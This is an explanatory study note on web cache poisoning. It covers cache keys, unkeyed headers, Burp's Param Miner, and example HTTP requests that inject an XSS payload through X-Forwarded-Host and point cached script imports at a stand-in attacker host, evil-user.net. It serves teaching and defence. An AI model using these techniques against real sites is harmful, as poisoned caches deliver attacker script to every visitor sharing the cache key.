# Web Cache Poisoning
#Cache-Poisoning #Server-Side #XSS

Web cache poisoning is an advanced technique whereby an attacker **exploits** the behaviour of a **web server** and **cache** so that a **harmful** HTTP response is served to other users.

Usually these attacks consist of two phases:
1. First, the attacker must work out how to send a response from the **back-end** server that contains some sort of **dangerous** payload.
2. Once successful, they need to ensure that their response is **cached** and then **served** to the intended victims.

A poisoned web cache can potentially be a **devastating** means of **distributing** numerous attacks such as [cross-site scripting (XSS)](Cross-Site%20Scripting%20(XSS).md).

## Web Cache
Web cache sits between the server and user and is used to save (cache) responses for a fixed amount of time. 

If another users send the same request, the cached response is then returned to the user. This eases load from the server by reducing the number of duplicate requests it must handle.

![](Images/Pasted%20image%2020220824143739.png)

### Cache Keys
Caches identify equivalent requests by comparing a **predefined subset** of the request's components, known as the **cache key**. Usually this would contain the request line and `Host` header. Components of the request that are **not** included in the cache key are said to be **unkeyed**.

*Note: All other components are ignored by the cache.

## Constructing A Web Cache Poisoning Attack
A web cache poisoning attack relies on the manipulation of [unkeyed](Web%20Cache%20Poisoning.md#Cache%20Keys) inputs such as headers. Web caches **ignore** [unkeyed](Web%20Cache%20Poisoning.md#Cache%20Keys) inputs when deciding whether to serve a cached response to the user. This means that they can be used to inject a payload and send a **poisoned** response to those with a matching cache key.

1. **Identifying Unkeyed Inputs** - The **param miner** extension in Burp can be used to find [unkeyed](Web%20Cache%20Poisoning.md#Cache%20Keys) headers within a request. These can later be used to conduct a cache poisoning attack.
2. **Elicit A Harmful Response** - Once [unkeyed](Web%20Cache%20Poisoning.md#Cache%20Keys) headers have been detected. The next step is to determine how a website processes them. A **header** must be found which can be used in a malicious way such as **manipulating data**.
3. **Cache The Response** - Whether or not the response is cached depends on **multiple** factors such as the file extension, content type, route, status code and response headers. This is the **hardest** stage of the attack.

## Exploiting Cache Design Flaws
### Delivering XSS Attacks
Web cache poisoning can be used to deliver [cross-site scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) payloads. For example, take the following **legitimate** request used to fetch an image:
```Request
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk
```

```Response
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

This can be **exploited** by altering the `X-Forwarded-For` header to a [cross-site scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) payload:
```Request
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

```Response
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

If this was **cached** then all users accessing `/en?region=uk` would receive the alert.

### Exploiting Resource Imports
Some sites use [unkeyed](Web%20Cache%20Poisoning.md#Cache%20Keys) headers to dynamically generate URLs for importing resources, for example JavaScript files:
``` Request
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0
```

```Response
HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

If the response containing this malicious URL is **cached**, the attacker's **JavaScript** file would be imported and executed in the browser session of any user whose request has a matching [cache key](Web%20Cache%20Poisoning.md#Cache%20Keys).